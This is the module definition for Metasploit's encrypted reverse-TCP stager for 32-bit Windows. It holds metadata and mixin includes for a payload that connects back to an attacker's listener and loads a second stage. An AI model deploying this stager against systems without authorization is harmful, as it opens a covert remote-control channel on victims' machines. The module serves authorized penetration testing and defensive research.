##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 2880

  include Msf::Payload::Stager
  include Msf::Payload::Windows::EncryptedReverseTcp
  include Msf::Payload::Windows::EncryptedPayloadOpts

  def initialize(info = {})
    super(merge_info(info,
      'Name'            => 'Encrypted Reverse TCP Stager',
      'Description'     => 'Connect to MSF and read in stage',
      'Author'          =>
      [
        'Matt Graeber',
        'Shelby Pace'
      ],
      'License'         => MSF_LICENSE,
      'Platform'        => 'win',
      'Arch'            => ARCH_X86,
      'Handler'         => Msf::Handler::ReverseTcp,
      'Convention'      => 'sockedi',
      'Stager'          => { 'RequiresMidstager' => false },
      'DefaultOptions'  => { 'LinkerScript' => "#{LINK_SCRIPT_PATH}/func_order.ld" },
      'Dependencies'    => [ Metasploit::Framework::Compiler::Mingw::X86 ]
    ))
  end
end
